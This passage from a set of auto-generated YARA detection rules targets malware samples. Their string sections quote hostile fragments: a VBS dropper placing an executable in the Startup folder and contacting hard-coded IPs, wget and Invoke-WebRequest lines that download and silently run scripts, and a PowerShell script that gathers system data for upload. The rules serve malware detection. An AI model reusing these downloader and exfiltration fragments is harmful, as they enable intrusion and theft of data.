      description = "_subset_batch - file e81d1c50b379ab71380ede7ad62222e759db861bccf9a745b4d3a22465dc3843_e81d1c50.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e81d1c50b379ab71380ede7ad62222e759db861bccf9a745b4d3a22465dc3843"
   strings:
      $x1 = "Const LocalFile = \"C:\\Users\\White\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ORDINI.exe\" " fullword ascii /* score: '37.00'*/
      $s2 = "url_array(1) = \"http://199.103.56.165/ORD-ALL/\" & userName & separ & computerName & \"/ORD-LAV.txt\" " fullword ascii /* score: '25.00'*/
      $s3 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-LAV" ascii /* score: '23.00'*/
      $s4 = "oShell.exec LocalFile " fullword ascii /* score: '20.00'*/
      $s5 = "url_array(0) = \"http://199.103.56.165/ORD-LAV.txt\" " fullword ascii /* score: '19.00'*/
      $s6 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s7 = "url_array(2) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/ORD-LAV.txt\" " fullword ascii /* score: '17.00'*/
      $s8 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-LAV" ascii /* score: '16.00'*/
      $s9 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s10 = "WScript.Sleep wait1" fullword ascii /* score: '13.00'*/
      $s11 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s12 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s13 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s14 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s15 = "xmlhttp.send" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule d9c8f5211125fd4e35458fd85b00f376d044908e7e4d485d9cadfe13ab64440c_d9c8f521 {
   meta:
      description = "_subset_batch - file d9c8f5211125fd4e35458fd85b00f376d044908e7e4d485d9cadfe13ab64440c_d9c8f521.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d9c8f5211125fd4e35458fd85b00f376d044908e7e4d485d9cadfe13ab64440c"
   strings:
      $s1 = "'Eyeline. arbejdsprocesserne underfiend" fullword ascii /* score: '20.00'*/
      $s2 = "Grundejers = Grundejers + \"%.%S%%%,F%%%\"" fullword ascii /* score: '18.00'*/
      $s3 = "Execute \"Sulfonyls.\" + Cremorne + \"Exe\" & chr(99) & \"ute Tysklandskortets,Polypodies,Armillaria,Nazimusik ,Carpocerite\"" fullword ascii /* score: '18.00'*/
      $s4 = "Grundejers = Grundejers + \"%i%.%\"" fullword ascii /* score: '18.00'*/
      $s5 = "Grundejers = Grundejers + \"%%s%%%%T%\"" fullword ascii /* score: '18.00'*/
      $s6 = "Grundejers = Grundejers + \"%I%%\"" fullword ascii /* score: '18.00'*/
      $s7 = "Grundejers = Grundejers + \"%D%%%%E%%%%f\"" fullword ascii /* score: '18.00'*/
      $s8 = "Grundejers = Grundejers + \"%%D%%%\"" fullword ascii /* score: '18.00'*/
      $s9 = "Grundejers = Grundejers + \"rwwww]wwww:\"" fullword ascii /* score: '17.00'*/
      $s10 = "Grundejers = Grundejers + \"]QQQQ:\"" fullword ascii /* score: '17.00'*/
      $s11 = "Set Amidide = GetObject(\"win\" + \"mgmts://./root/default:StdRegProv\")" fullword ascii /* score: '16.00'*/
      $s12 = "Grundejers = Grundejers + \"Get-Dis\"" fullword ascii /* score: '16.00'*/
      $s13 = "'Undecide overhostility? dagtemperaturernes: springed. bebopper" fullword ascii /* score: '16.00'*/
      $s14 = "Grundejers = Grundejers + \"%%l%%%\"" fullword ascii /* score: '15.00'*/
      $s15 = "Grundejers = Grundejers + \"%%g%%%%l%\"" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 400KB and
      8 of them
}

rule e5e19f5738fae33b5023c0e7e94943fbe0ad9b8360a109a37f00cbcc5ecf30ea_e5e19f57 {
   meta:
      description = "_subset_batch - file e5e19f5738fae33b5023c0e7e94943fbe0ad9b8360a109a37f00cbcc5ecf30ea_e5e19f57.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5e19f5738fae33b5023c0e7e94943fbe0ad9b8360a109a37f00cbcc5ecf30ea"
   strings:
      $s1 = "Execute NgfSEUgDrU(nPDaUdXpdc)" fullword ascii /* score: '18.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x506e and filesize < 40KB and
      all of them
}

rule e9baa079dedb225cbddab57c786b00d211f0643af27c270516784256456c3dc4_e9baa079 {
   meta:
      description = "_subset_batch - file e9baa079dedb225cbddab57c786b00d211f0643af27c270516784256456c3dc4_e9baa079.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9baa079dedb225cbddab57c786b00d211f0643af27c270516784256456c3dc4"
   strings:
      $s1 = "Execute ElpVlPmLeP(NgLgjXlrjO)" fullword ascii /* score: '18.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x674e and filesize < 40KB and
      all of them
}

rule c77ef63e3d632e14e3613260892ba42153ef2585d0e12fdf37047ef6118e4e08_c77ef63e {
   meta:
      description = "_subset_batch - file c77ef63e3d632e14e3613260892ba42153ef2585d0e12fdf37047ef6118e4e08_c77ef63e.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c77ef63e3d632e14e3613260892ba42153ef2585d0e12fdf37047ef6118e4e08"
   strings:
      $x1 = "<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"" ascii /* score: '58.00'*/
      $x2 = "<style id=\"ashe_dynamic_css\">#top-bar {background-color: #ffffff;}#top-bar a {color: #000000;}#top-bar a:hover,#top-bar li.cur" ascii /* score: '58.00'*/
      $x3 = ";!function(a,b){a(function(){\"use strict\";function a(a,b){return null!=a&&null!=b&&a.toLowerCase()===b.toLowerCase()}function " ascii /* score: '57.00'*/
      $x4 = "shortPattern:/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu" ascii /* score: '39.00'*/
      $x5 = "<nav class=\"mpp-post-navigation next-previous\" role=\"navigation\"><div class=\"mpp-page-link page-link\"\"><a href=\"https://" ascii /* score: '36.00'*/
      $x6 = "!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.s" ascii /* score: '35.00'*/
      $x7 = "a,\"property:\",f,\"value:\",b);var g=ai_load_cookie();if(\"\"===b){if(g.hasOwnProperty(a)){delete g[a][f];a:{f=g[a];for(e in f)" ascii /* score: '33.00'*/
      $x8 = "out*=\"list\"] .blog-grid > li,.page-content .author-description,.page-content .related-posts,.page-content .entry-comments,.pag" ascii /* score: '31.00'*/
      $x9 = "f+\"-dbg\");g=0;for(b=c.length;g<b;g++)e=c[g],e.querySelector(\".ai-status\").textContent=ai_debug_cookie_status,e.querySelector" ascii /* score: '31.00'*/
      $s10 = "<!-- This site is optimized with the Yoast SEO plugin v25.0 - https://yoast.com/wordpress/plugins/seo/ -->" fullword ascii /* score: '30.00'*/
      $s11 = "<link rel='stylesheet' id='recent-posts-widget-with-thumbnails-public-style-css' href='https://me.networthranker.com/wp-content/" ascii /* score: '30.00'*/
      $s12 = "fy(g),{expires:365,path:\"/\"});if(c)if(a=m(AiCookies.get(\"aiBLOCKS\")),\"undefined\"!=typeof a){console.log(\"AI COOKIE NEW\"," ascii /* score: '30.00'*/
      $s13 = "<link rel='stylesheet' id='recent-posts-widget-with-thumbnails-public-style-css' href='https://me.networthranker.com/wp-content/" ascii /* score: '30.00'*/
      $s14 = "page-link\">NEXT PAGE </a></div><!-- .nav-links --></nav><!-- .mpp-post-navigation --><!-- CONTENT END 2 -->" fullword ascii /* score: '30.00'*/
      $s15 = "null!=c&&(c.classList.remove(\"status-error\"),c.classList.add(\"status-ok\"))):(null!=a&&(a.textContent=\"IAB TCF 2.0 __tcfapi " ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 600KB and
      1 of ($x*) and all of them
}

rule e08f50c728a1e37877894d399fe697a77b4abd9068f5b0a036fe83649f86728d_e08f50c7 {
   meta:
      description = "_subset_batch - file e08f50c728a1e37877894d399fe697a77b4abd9068f5b0a036fe83649f86728d_e08f50c7.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e08f50c728a1e37877894d399fe697a77b4abd9068f5b0a036fe83649f86728d"
   strings:
      $x1 = "nsul difficult nerve explain expand myself exception language face championship reputation hill him earn youth helicopter look s" ascii /* score: '33.00'*/
      $s2 = "n developing beauty extranjero occur simple veteran extranjero language drop believe separate respondent escape elevar increasin" ascii /* score: '29.00'*/
      $s3 = "rea regardless estimar craft boyfriend design negotiation boca slowly grave everyday sacred opposite wonderful vehicle being fas" ascii /* score: '24.00'*/
      $s4 = "n alabanza whose floor reading healthy greatest engineer significance unit elevar return conventional esfuerzo four water post c" ascii /* score: '21.00'*/
      $s5 = "n drag variety develop sharp however potato task can unknown statistics breathe accept situation chemical obviously popular prod" ascii /* score: '21.00'*/
      $s6 = "n coach route pack approach lung gain dimension demand fill thick quality slow past comment descansar habit electronic doubt hom" ascii /* score: '20.00'*/
      $s7 = "n wild team fashion PM utility assign lawn matter black forget escalera wet admirar nobody author satisfy primary truck surface " ascii /* score: '20.00'*/
      $s8 = "n victory consumption branch wire garden sanction balance prepare thus freedom comfortable chip secret hat honey protect psychol" ascii /* score: '20.00'*/
      $s9 = "gly involve process future let wisdom nearby debt museum tissue subject killing truth respond port offensive compare slow butter" ascii /* score: '20.00'*/
      $s10 = "n rice anticipate fail estructura prefer twenty characterize priority wild gift third bottle afraid stress survival issue overlo" ascii /* score: '20.00'*/
      $s11 = "ria tactic brick argue father palm actitud help dish publication committee process bag mere production intervention peak lawyer " ascii /* score: '19.00'*/
      $s12 = "ino arrangement describe quick besides bedroom alive bajo standing nine resemble damage twelve ring property follow bebedero hor" ascii /* score: '19.00'*/
      $s13 = "tico violation change along similar scientist what population tall core spokesman recommendation breakfast favorite market congr" ascii /* score: '19.00'*/
      $s14 = "tico critical send Jewish national environmental study lab environmental software cooperation skin farm destroy coat heel traffi" ascii /* score: '19.00'*/
      $s15 = " everywhere avanzar huge quarter journal might prisoner soup quality infection derecho derecho match ally temporary acknowledge " ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule e4427167f7926e7aa0011770cc262cbf1cf1c2e554c257231e20bac994e4fa94_e4427167 {
   meta:
      description = "_subset_batch - file e4427167f7926e7aa0011770cc262cbf1cf1c2e554c257231e20bac994e4fa94_e4427167.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4427167f7926e7aa0011770cc262cbf1cf1c2e554c257231e20bac994e4fa94"
   strings:
      $s1 = "wget http://115.28.186.246:81/packages/ippbx/run/chkadduser.sh" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://115.28.186.246:81/packages/ippbx/ROOT.tar.gz" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://115.28.186.246:81/packages/ippbx/run/usernum.sh" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://115.28.186.246:81/packages/packages/erlang-17.5-Centos7.x_Linux-x86_64.tar.gz" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://115.28.186.246:81/packages/packages/rabbitmq-server-3.6.1-1.noarch.rpm" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://115.28.186.246:81/packages/ippbx/run/chspring.sh" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://115.28.186.246:81/packages/ippbx/ocean.tar.gz" fullword ascii /* score: '20.00'*/
      $s8 = "wget http://115.28.186.246:81/packages/ippbx/run/chkpbx.sh" fullword ascii /* score: '20.00'*/
      $s9 = "wget http://115.28.186.246:81/packages/ippbx/run/chkpbx1.sh" fullword ascii /* score: '20.00'*/
      $s10 = "wget http://115.28.186.246:81/packages/ippbx/run/DataSourceBak.sh" fullword ascii /* score: '20.00'*/
      $s11 = "wget http://115.28.186.246:81/packages/ippbx/run/CRM.sh" fullword ascii /* score: '20.00'*/
      $s12 = "wget http://115.28.186.246:81/packages/ippbx/run/PBX.sh" fullword ascii /* score: '20.00'*/
      $s13 = "wget http://115.28.186.246:81/packages/packages/test.keystore" fullword ascii /* score: '20.00'*/
      $s14 = "wget http://115.28.186.246:81/packages/ippbx/nginx.tar.gz" fullword ascii /* score: '20.00'*/
      $s15 = "wget http://115.28.186.246:81/packages/packages/freeswitch.service" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      8 of them
}

rule f162527d35799b2328ce7369ee69ed5893119b3635ecc80e4acfe8e50c7e5859_f162527d {
   meta:
      description = "_subset_batch - file f162527d35799b2328ce7369ee69ed5893119b3635ecc80e4acfe8e50c7e5859_f162527d.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f162527d35799b2328ce7369ee69ed5893119b3635ecc80e4acfe8e50c7e5859"
   strings:
      $x1 = "                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetU" ascii /* score: '42.00'*/
      $x2 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, " ascii /* score: '39.00'*/
      $x3 = "                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetU" ascii /* score: '39.00'*/
      $x4 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken" fullword ascii /* score: '39.00'*/
      $x5 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken" fullword ascii /* score: '39.00'*/
      $x6 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken" fullword ascii /* score: '39.00'*/
      $x7 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs" ascii /* score: '39.00'*/
      $x8 = "                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEv" ascii /* score: '39.00'*/
      $x9 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, " ascii /* score: '39.00'*/
      $x10 = "            $O84UuyzcKLjSGwdpjbN4vNlHQXCWAHzMnYiINh1Snu7HwZEgNaAAKjDm39gqSQ2EYLR8xHTtBbKK1thT495lM5EFrbxRNBIV8wzVHgZXAqaByAqU6UF" ascii /* score: '31.00'*/
      $x11 = "                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs" ascii /* score: '31.00'*/
      $x12 = "                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEv" ascii /* score: '31.00'*/
      $s13 = "        $Result = $aDJXTSnKuS7hC2PYm42EzrdHFovEmL4BcdEMpr3WWagVVj0H8Liaq4sIp7Fd9JpKSy9IdjggGEIsoMfcKG2mop0AhXR68CFfHPxI8N6QhobzK" ascii /* score: '30.00'*/
      $s14 = "        $qI50RJ9nPctbcRgkgzioHOFUnKi8aEKe8gPsRtpZDchaYRTyToWUCmPIqwuUGFBjzBnHhVC4cnfuyR85wpmrRLQ2nrgSQ6YIhFB45lOC5Q7i6QhW0au7PK4" ascii /* score: '27.00'*/
      $s15 = "            JHIcUiGReVyxZlyCwWdcMWfbudbqgwFYHWalNuym -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameter" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule d21811fc3641d709726186a3d94564afe947612d4f3e81c2cac0b9e8fa7c166b_d21811fc {
   meta:
      description = "_subset_batch - file d21811fc3641d709726186a3d94564afe947612d4f3e81c2cac0b9e8fa7c166b_d21811fc.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d21811fc3641d709726186a3d94564afe947612d4f3e81c2cac0b9e8fa7c166b"
   strings:
      $s1 = "tZXNzYWdlLmx0ciAjZnItb3ZlcnJ1bnttYXJnaW4tbGVmdDowO21hcmdpbi1yaWdodDouMjVlbX0jZXhwaXJlZC1yZWZyZXNoLWxpbmssI3RpbWVvdXQtcmVmcmVzaC1" ascii /* base64 encoded string */ /* score: '29.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s5 = "lLWF1dG8gaDF7Y29sb3I6I2ZmZn0udGhlbWUtYXV0byAjY2hhbGxlbmdlLWVycm9yLXRpdGxle2NvbG9yOiNmZmEyOTl9LnRoZW1lLWF1dG8gI2NoYWxsZW5nZS1lcnJ" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s6 = "wfSNjaGFsbGVuZ2UtZXJyb3ItdGl0bGUgYXtjb2xvcjojMjMyMzIzfSNjaGFsbGVuZ2UtZXJyb3ItdGl0bGUgYTpob3ZlciwjY2hhbGxlbmdlLWVycm9yLXRpdGxlIGE" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s7 = "lbWUtZGFyayAjY2hhbGxlbmdlLW92ZXJsYXkgYTphY3RpdmUsLnRoZW1lLWRhcmsgI2NoYWxsZW5nZS1vdmVybGF5IGE6Zm9jdXMsLnRoZW1lLWRhcmsgI2NoYWxsZW5" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s8 = "zIGE6aG92ZXIsI3Rlcm1zIGE6Zm9jdXMsI3Rlcm1zIGE6YWN0aXZle2NvbG9yOiMxNjYzNzk7dGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZX0jY2hhbGxlbmdlLWVycm9" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s9 = "lcmxheSwudGhlbWUtYXV0byAjY2hhbGxlbmdlLWVycm9yLXRleHR7Y29sb3I6I2ZmYTI5OX0udGhlbWUtYXV0byAjY2hhbGxlbmdlLW92ZXJsYXkgYSwudGhlbWUtYXV" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s10 = "0byAjY2hhbGxlbmdlLWVycm9yLXRleHQgYSwudGhlbWUtYXV0byAjY2hhbGxlbmdlLW92ZXJsYXkgYTp2aXNpdGVkLC50aGVtZS1hdXRvICNjaGFsbGVuZ2Utb3Zlcmx" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s11 = "0bGV7Y29sb3I6I2ZmYTI5OX0udGhlbWUtZGFyayAjY2hhbGxlbmdlLWVycm9yLXRpdGxlIGEsLnRoZW1lLWRhcmsgI2NoYWxsZW5nZS1lcnJvci10aXRsZSBhOnZpc2l" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s12 = "0ZWQsLnRoZW1lLWRhcmsgI2NoYWxsZW5nZS1lcnJvci10aXRsZSBhOmxpbmt7Y29sb3I6I2JiYn0udGhlbWUtZGFyayAjY2hhbGxlbmdlLWVycm9yLXRpdGxlIGE6aG9" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s13 = "oYWxsZW5nZS1vdmVybGF5IGEsI2NoYWxsZW5nZS1vdmVybGF5IGE6dmlzaXRlZCwjY2hhbGxlbmdlLW92ZXJsYXkgYTpsaW5re2NvbG9yOiMyMzIzMjN9I2NoYWxsZW5" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s14 = "lcmxheSBhOnZpc2l0ZWQsLnRoZW1lLWRhcmsgI2NoYWxsZW5nZS1vdmVybGF5IGE6bGluaywudGhlbWUtZGFyayAjY2hhbGxlbmdlLWVycm9yLXRleHQgYTp2aXNpdGV" ascii /* base64 encoded string*/ /* score: '26.00'*/
      $s15 = "vci1tZXNzYWdlIGE6aG92ZXIsLmVycm9yLW1lc3NhZ2UgYTpmb2N1c3tjb2xvcjojMTY2Mzc5fS5lcnJvci1tZXNzYWdlLmx0cntkaXJlY3Rpb246bHRyfS5lcnJvci1" ascii /* base64 encoded string*/ /* score: '26.00'*/
   condition:
      uint16(0) == 0x6128 and filesize < 300KB and
      8 of them
}

rule d3a877b59ffdc9ae866853ffd6ee5b2423bc82b0d43143df7be75e230e05c2f9_d3a877b5 {
   meta:
      description = "_subset_batch - file d3a877b59ffdc9ae866853ffd6ee5b2423bc82b0d43143df7be75e230e05c2f9_d3a877b5.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3a877b59ffdc9ae866853ffd6ee5b2423bc82b0d43143df7be75e230e05c2f9"
   strings:
      $s1 = "        $domU | Out-File -FilePath 'C:\\Users\\Public\\users.txt' -Encoding utf8" fullword ascii /* score: '30.00'*/
      $s2 = "    [string]$OutFile    = 'C:\\Users\\Public\\123.txt'," fullword ascii /* score: '26.00'*/
      $s3 = "    if (Get-Command Get-LocalUser -ErrorAction 0) {" fullword ascii /* score: '20.00'*/
      $s4 = "try { Add-Section \"C:\\Users listing\" (Get-UsersListing) } catch {}" fullword ascii /* score: '19.00'*/
      $s5 = "\"=== System snapshot: $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssK') ===\" | Out-File -FilePath $OutFile -Encoding utf8" fullword ascii /* score: '19.00'*/
      $s6 = "$form.Add([System.Net.Http.StringContent]::new('{\"content\":\"" fullword ascii /* score: '18.00'*/
      $s7 = "# === system-snapshot-and-upload.ps1 ===" fullword ascii /* score: '17.00'*/
      $s8 = "function Get-UsersListing {" fullword ascii /* score: '17.00'*/
      $s9 = "    param($Root='C:\\Users',$MaxDepth=4)" fullword ascii /* score: '16.00'*/
      $s10 = "        $lu = Get-LocalUser | Format-Table Name,Enabled,LastLogon -AutoSize | Out-String" fullword ascii /* score: '15.00'*/
      $s11 = "$part.Headers.ContentType = 'text/plain'" fullword ascii /* score: '14.00'*/
      $s12 = "} catch { Add-Section \"Local users\" \"Failed.\" }" fullword ascii /* score: '14.00'*/
      $s13 = "\"=== Done: $OutFile ===\" | Add-Content -Path $OutFile" fullword ascii /* score: '13.00'*/
      $s14 = "$part   = [System.Net.Http.StreamContent]::new($stream)" fullword ascii /* score: '13.00'*/
      $s15 = "$form   = [System.Net.Http.MultipartFormDataContent]::new()" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 10KB and
      8 of them
}

rule c208b15a1b8dec53b0d1cffde1d33b6d257424a8ea8816ad383899dd5724460e_c208b15a {
   meta:
      description = "_subset_batch - file c208b15a1b8dec53b0d1cffde1d33b6d257424a8ea8816ad383899dd5724460e_c208b15a.cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c208b15a1b8dec53b0d1cffde1d33b6d257424a8ea8816ad383899dd5724460e"
   strings:
      $s1 = "Runglib" fullword ascii /* score: '9.00'*/
      $s2 = "jbtzvcng" fullword ascii /* score: '8.00'*/
      $s3 = "]%D%o~%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 3000KB and
      all of them
}

rule c2c4a11315f63b0f9f91b69c0c9bcfa6d12bcc62425ff2e90632a0d7fa09023d_c2c4a113 {
   meta:
      description = "_subset_batch - file c2c4a11315f63b0f9f91b69c0c9bcfa6d12bcc62425ff2e90632a0d7fa09023d_c2c4a113.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c2c4a11315f63b0f9f91b69c0c9bcfa6d12bcc62425ff2e90632a0d7fa09023d"
   strings:
      $x1 = "powershell -Command \"& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Ur" ascii /* score: '32.00'*/
      $x2 = "powershell -Command \"& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Ur" ascii /* score: '32.00'*/
      $s3 = "%pythonInstaller% /quiet InstallAllUsers=0 TargetDir=%installDir% PrependPath=1" fullword ascii /* score: '30.00'*/
      $s4 = "powershell -Command \"& { Invoke-WebRequest -Uri '%baseUrl%/xw.py' -OutFile '%installDir%\\xw.py' }\"" fullword ascii /* score: '29.00'*/
      $s5 = "powershell -Command \"& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }\"" fullword ascii /* score: '29.00'*/
      $s6 = "powershell -Command \"& { Invoke-WebRequest -Uri '%baseUrl%/vr.py' -OutFile '%installDir%\\vr.py' }\"" fullword ascii /* score: '29.00'*/
      $s7 = "powershell -Command \"& { Invoke-WebRequest -Uri '%baseUrl%/xw.py' -OutFile '%installDir%\\xw1.py' }\"" fullword ascii /* score: '29.00'*/
      $s8 = "powershell -Command \"& { Invoke-WebRequest -Uri '%baseUrl%/ap.py' -OutFile '%installDir%\\ap.py' }\"" fullword ascii /* score: '29.00'*/
      $s9 = "powershell -Command \"& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Ur" ascii /* score: '28.00'*/
      $s10 = "set \"pythonInstaller=%APPDATA%\\python-3.12.5-amd64.exe\"" fullword ascii /* score: '25.00'*/
      $s11 = "start /b \"\" \"%installDir%\\python.exe\" xw1.py" fullword ascii /* score: '23.00'*/
      $s12 = "start /b \"\" \"%installDir%\\python.exe\" vr.py" fullword ascii /* score: '23.00'*/
      $s13 = "start /b \"\" \"%installDir%\\python.exe\" ap.py" fullword ascii /* score: '23.00'*/
      $s14 = "set \"cmdDestination=%APPDATA%\\update.cmd\"" fullword ascii /* score: '23.00'*/
      $s15 = "start /b \"\" \"%installDir%\\python.exe\" xw.py" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule c3b7abcb583b90559af973dd18bf5ccba48d3323e5e2e8bc0b11ff54425e34dd_c3b7abcb {
   meta:
      description = "_subset_batch - file c3b7abcb583b90559af973dd18bf5ccba48d3323e5e2e8bc0b11ff54425e34dd_c3b7abcb.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c3b7abcb583b90559af973dd18bf5ccba48d3323e5e2e8bc0b11ff54425e34dd"
   strings:
      $x1 = "var rc4,base64Chars,base64Decode,getText,baseUrl,url,xmlHttp,stage_1,stage_2,key,cipherBytes,plainText,shell,verParts;(function(" ascii /* score: '32.50'*/
      $s2 = "var rc4,base64Chars,base64Decode,getText,baseUrl,url,xmlHttp,stage_1,stage_2,key,cipherBytes,plainText,shell,verParts;(function(" ascii /* score: '20.00'*/
      $s3 = "){var PRf='',joX=775-764;function NkN(f){var t=5235101;var x=f.length;var e=[];for(var u=0;u<x;u++){e[u]=f.charAt(u)};for(var u=" ascii /* score: '9.00'*/
      $s4 = " &Z=__xZ lj(!,.!_D!toi16o!(0%.i;Z,shf%rexlS%eb6, o))j?S6]=95 cc%).,a.p1Liy0r.6;3)\\/)ch20ZZp3r5e ,(i)zZ)nZix;6)s3i%.S (x.7kl+_7h" ascii /* score: '8.00'*/
      $s5 = "]=9t,f-xr(;5;pahn.d[r0(t71S,,;l=riap,C}ethf (f=z.6ulpq(te);sae<c+n)pt(p+)ve=-x,i](r+7h 1)=,;cl1(gifo(7+=;rpui{u;l9v)o}i=+ {cw+2n" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__188b761d {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_188b761d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "188b761d7dcaa76f11517e1f1675487d6127d0d942b20a56a5ea4127395c571b"
   strings:
